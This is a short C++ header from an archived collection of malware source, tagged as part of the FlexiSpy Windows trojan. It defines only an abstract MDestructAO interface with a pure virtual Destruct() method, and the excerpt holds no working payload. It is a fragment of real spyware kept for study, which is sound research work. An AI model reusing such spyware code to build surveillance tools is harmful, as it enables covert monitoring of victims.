/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#ifndef _MDESTRUCTAO_H__
#define _MDESTRUCTAO_H__

/**
This is special interface of AO that */
class MDestructAO
	{
public:	
	virtual ~MDestructAO(){}
	virtual void Destruct() = 0;
	};

#endif
